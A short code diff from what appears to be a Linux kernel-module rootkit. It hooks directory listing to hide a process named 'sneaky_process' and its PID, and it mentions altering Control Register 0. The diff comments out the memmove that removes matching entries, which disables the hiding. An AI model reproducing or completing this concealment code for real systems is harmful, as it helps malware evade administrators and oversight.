@@ -17,7 +17,7 @@ struct linux_dirent {
   char           d_name[];
   };
 static char* processname = "sneaky_process";
-static char proc_dir[50] = "/proc/" ;
+//static char proc_dir[50] = "/proc/" ;
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -65,10 +65,10 @@ struct linux_dirent __user *dirp, unsigned int count){
     //printk("%s\n", dirp->d_name);
     if( strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
       printk("%s\n", dirp->d_name);
-      memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
+      /*memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
       value -= len;
       printk(KERN_INFO "hide successful\n");
-      continue;
+      continue;*/
     }
     if(tlen) {
       dirp = (struct linux_dirent* ) ((char*) dirp + dirp->d_reclen);
